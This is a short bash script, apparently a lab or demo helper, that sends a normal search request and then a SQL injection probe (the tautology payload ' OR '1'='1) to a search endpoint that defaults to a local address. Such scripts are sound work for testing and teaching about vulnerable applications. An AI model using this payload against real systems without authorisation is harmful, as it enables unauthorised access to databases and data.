#!/usr/bin/env bash
TARGET=${1:-http://127.0.0.1:8000}
echo "[*] Normal search for 'ali'"
curl -s "${TARGET}/search?q=ali" | sed -n '1,40p'
echo
echo "[*] SQL injection probe (single quote)"
curl -s "${TARGET}/search?q=' OR '1'='1" | sed -n '1,60p'
